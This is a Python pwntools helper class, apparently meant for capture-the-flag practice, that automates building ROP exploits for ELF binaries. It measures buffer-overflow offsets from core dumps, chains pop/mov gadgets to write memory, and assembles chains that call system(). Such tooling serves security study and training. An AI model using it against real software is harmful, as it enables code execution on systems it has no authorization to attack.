#!/usr/bin/env python

from pwn import *

class PAPA_ROP:

    def __init__(self, filename):
        self.filename = filename
        self.elf = context.binary = ELF(filename)
        self.rop = ROP(self.elf)
        self.arch = self.elf.get_machine_arch()
        self.payload = ""

        context.delete_corefiles = True
    
    #####################################
    ##### MANUAL PAYLOAD GENERATION #####
    #####################################

    # Generate padding before overflow
    def get_padding(self):
        return "A"*self.get_padding_length()

    # Get all the functions of the binary
    def get_functions(self):
        return self.elf.functions

    # Get the specified function address
    def get_function_addr(self, function):
        return self.elf.functions[function].address

    # Get the specified symbol address
    def get_symbol_addr(self, symbol):
        return self.elf.symbols[symbol]

    # Get the specified string address
    def get_string_addr(self, string):
        return list(self.elf.search(string, False))[0]

    # Pack a value based on the binary architecture
    def p(self, value):
        if ("64" in self.arch):
            return p64(value)
        elif ("32" in self.arch or "86" in self.arch):
            return p32(value)
        else:
            log.failure("Unknown architecture: " + arch)
            exit(1) 
    
    # Write a string to a location using pop and mov gadgets
    #       pop rDST; pop rSRC; ret (pop gadget)
    #       mov [rDST], rSRC; ret   (mov gadget)
    # TODO - fix for when rDST and rSRC are swapped
    def pop_mov_write(self, pop, mov, what, where):
        payload = ""
        nbytes = 8 if ("64" in self.arch) else 4
        while (what):
            payload += self.p(pop)
            payload += self.p(where)
            payload += what[:nbytes]
            payload += self.p(mov)
            what = what[nbytes:]
            where += nbytes
        return payload

    ########################################
    ##### AUTOMATED PAYLOAD GENERATION #####
    ########################################

    # Add to the ROP chain to call system with the given argument
    def system(self, arg):
        self.rop.system(arg)
        return

    # Add to the ROP chain to call a function with the given arguments
    def call(self, function, args=[]):
        self.rop.call(function, args)
        return

    # Get the ROP chain payload
    def chain(self):
        return self.rop.chain()

    ###############################
    ##### PROCESS INTERACTION #####
    ###############################
    def start_process(self, args=[]):
        self.process = process(self.filename, args)
        return

    def sendafter(self, delim, payload):
        self.process.sendafter(delim, payload)
        return

    def recvline(self):
        return self.process.recvline()

    def recvall(self):
        return self.process.recvall()

    def interactive(self):
        self.process.interactive()
        return

    #################################
    ##### MISC/HELPER FUNCTIONS #####
    #################################
    
    # Log all I/O
    def log_all(self, status):
        if (status == True):
            context.log_level = logging.DEBUG
        else:
            context.log_level = 20
        return

    # Get the number of bytes before overflow occurs
    def get_padding_length(self):
        p = process(self.elf.path)
        p.sendline(cyclic(4096))
        p.wait()
        core = p.corefile
        try:
            sub = core.read(core.esp-4, 4)
        except:
            sub = core.read(core.rsp, 4)

        return cyclic_find(sub)

